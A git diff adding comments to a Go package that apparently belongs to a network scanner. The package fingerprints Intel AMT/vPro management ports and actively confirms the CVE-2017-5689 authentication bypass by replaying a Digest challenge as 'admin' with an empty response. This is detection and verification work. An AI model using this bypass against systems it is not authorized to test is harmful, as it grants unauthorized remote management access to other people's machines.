@@ -1,3 +1,9 @@
+// Package amt probes Intel AMT / vPro endpoints and actively verifies the
+// CVE-2017-5689 (INTEL-SA-00075) authentication bypass: AMT's web server compares
+// the client's HTTP Digest response with strncmp() over the CLIENT-supplied
+// length, so an empty response="" matches any account and authenticates. This is
+// confirmed on the wire (a protected page flips 401 -> 200), not inferred from
+// the version banner. /wsman Identify metadata is exposed even on patched boxes.
 package amt
 
 import (
@@ -13,15 +19,18 @@ import (
 	"github.com/runZeroInc/oobscan/pkg/netaddr"
 )
 
+// CleartextPort is AMT's non-TLS management port.
 const CleartextPort = 16992
 
+// TLSPort is AMT's HTTPS management port.
 const TLSPort = 16993
 
+// Result captures AMT pre-auth data.
 type Result struct {
 	Host            string
 	Cleartext       bool
 	TLS             bool
-	Present         bool
+	Present         bool // an AMT management server answered on 16992/16993
 	Port            int
 	HTTPStatus      int
 	ServerHdr       string
@@ -29,16 +38,18 @@ type Result struct {
 	Fingerprint     string
 	Version         string
 	VersionSource   string
-	VersionInRange  bool
-	AuthBypass      bool
-	BypassPort      int
-	BypassPath      string
-	BypassRealm     string
+	VersionInRange  bool   // Version falls in the CVE-2017-5689 affected 6.0-11.6 band
+	AuthBypass      bool   // empty-digest replay authenticated (CVE-2017-5689)
+	BypassPort      int    // port the bypass was confirmed on
+	BypassPath      string // the Digest-protected path that flipped 401 -> 200
+	BypassRealm     string // the device-reported Digest realm accepted with an empty response
 	Body            string
 }
 
 var amtVersionRe = regexp.MustCompile(`(?i)(?:technology|standard\s+manageability|amt)\s*([0-9]+(?:\.[0-9]+){1,3})`)
 
+// Probe hits 16992/16993 and fingerprints AMT (presence + version). It does not
+// attempt the auth bypass; call VerifyEmptyDigest for the active confirmation.
 func Probe(host string, timeout time.Duration) (*Result, error) {
 	client := httpx.Client(timeout)
 	r := &Result{Host: host}
@@ -53,7 +64,7 @@ func Probe(host string, timeout time.Duration) (*Result, error) {
 	} {
 		ctx, cancel := context.WithTimeout(context.Background(), timeout)
 		req, err := http.NewRequestWithContext(ctx, "GET", ep.URL, nil)
-		if err != nil {
+		if err != nil { // malformed URL (e.g. an unbracketed IPv6 host) - never Do(nil)
 			cancel()
 			continue
 		}
@@ -146,6 +157,11 @@ func probeAMTVersionPaths(client *http.Client, base string, timeout time.Duratio
 	return "", ""
 }
 
+// VerifyEmptyDigest actively confirms CVE-2017-5689 against a fingerprinted AMT
+// box: it requests a Digest-protected page, then replays the challenge with an
+// empty response="" field. A vulnerable AMT authenticates (200); a patched one
+// re-challenges (401). It sets r.AuthBypass/BypassPort on success. This is an
+// active login attempt, so callers gate it behind an online/creds flag.
 func VerifyEmptyDigest(r *Result, timeout time.Duration) {
 	client := httpx.ClientWithRedirect(timeout, func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse })
 	type ep struct {
@@ -170,8 +186,13 @@ func VerifyEmptyDigest(r *Result, timeout time.Duration) {
 	}
 }
 
+// emptyDigestAccepted requests a protected AMT page and replays the Digest
+// challenge with an empty response. On success it returns true plus the path that
+// flipped 401 -> 200 and the device-reported Digest realm, so the caller can emit
+// device-sourced proof of the confirmed bypass.
 func emptyDigestAccepted(client *http.Client, base string, timeout time.Duration) (ok bool, path, realm string) {
-
+	// AMT's management pages (index, hardware inventory, remote control) are
+	// Digest-protected; index.htm challenges first.
 	for _, p := range []string{"/index.htm", "/hw-sys.htm", "/remote.htm"} {
 		ctx, cancel := context.WithTimeout(context.Background(), timeout)
 		req, err := http.NewRequestWithContext(ctx, "GET", base+p, nil)
@@ -188,10 +209,10 @@ func emptyDigestAccepted(client *http.Client, base string, timeout time.Duration
 		_ = resp.Body.Close()
 		cancel()
 		if resp.StatusCode != http.StatusUnauthorized || !strings.HasPrefix(strings.ToLower(strings.TrimSpace(ch)), "digest") {
-			continue
+			continue // not a Digest-protected resource
 		}
 		rlm, nonce, qop := digestField(ch, "realm"), digestField(ch, "nonce"), digestField(ch, "qop")
-
+		// Craft a well-formed Digest header for user "admin" with response="".
 		auth := fmt.Sprintf(`Digest username="admin", realm=%q, nonce=%q, uri=%q, response=""`, rlm, nonce, p)
 		if qop != "" {
 			auth += `, qop=auth, nc=00000001, cnonce="0a4f113b"`
@@ -210,12 +231,14 @@ func emptyDigestAccepted(client *http.Client, base string, timeout time.Duration
 		}
 		_ = resp2.Body.Close()
 		if resp2.StatusCode == http.StatusOK {
-			return true, p, rlm
+			return true, p, rlm // empty response accepted -> auth bypass confirmed
 		}
 	}
 	return false, "", ""
 }
 
+// digestField extracts a single token from a WWW-Authenticate: Digest header,
+// e.g. digestField(`Digest realm="X", nonce="Y"`, "nonce") == "Y".
 func digestField(header, key string) string {
 	i := strings.Index(strings.ToLower(header), strings.ToLower(key)+"=")
 	if i < 0 {
@@ -234,6 +257,8 @@ func digestField(header, key string) string {
 	return strings.TrimSpace(v[:end])
 }
 
+// isAMT reports whether a response came from an Intel AMT / vPro management
+// server, using either the Server header or the well-known body marker.
 func isAMT(server, body string) bool {
 	_, _, ok := amtFingerprint(server, body)
 	return ok
@@ -268,6 +293,9 @@ func amtFingerprint(server, body string) (source, fingerprint string, ok bool) {
 	return "", "", false
 }
 
+// extractVersionFromServer pulls the AMT firmware version out of the Server
+// header, e.g. "Intel(R) Active Management Technology 11.8.50" -> "11.8.50" or
+// "Intel(R) AMT 9.0.30" -> "9.0.30".
 func extractVersionFromServer(server string) string {
 	for _, marker := range []string{"Technology ", "Standard Manageability ", "AMT "} {
 		if _, after, ok := strings.Cut(server, marker); ok {
@@ -277,7 +305,7 @@ func extractVersionFromServer(server string) string {
 				end = len(tail)
 			}
 			cand := strings.TrimSpace(tail[:end])
-
+			// Guard against matching a trailing "AMT" with no version.
 			if len(cand) > 0 && cand[0] >= '0' && cand[0] <= '9' {
 				return cand
 			}
@@ -287,7 +315,7 @@ func extractVersionFromServer(server string) string {
 }
 
 func extractVersion(body string) string {
-
+	// "Intel(R) Active Management Technology 11.8.50" style.
 	_, after, ok := strings.Cut(body, "Technology ")
 	if !ok {
 		return ""
@@ -312,7 +340,7 @@ func extractVersionLoose(s string) string {
 }
 
 func vulnerable20175689(ver string) bool {
-
+	// Affected: 6.0.x through 11.6.x (inclusive).
 	major, minor := parseVer(ver)
 	if major < 6 {
 		return false
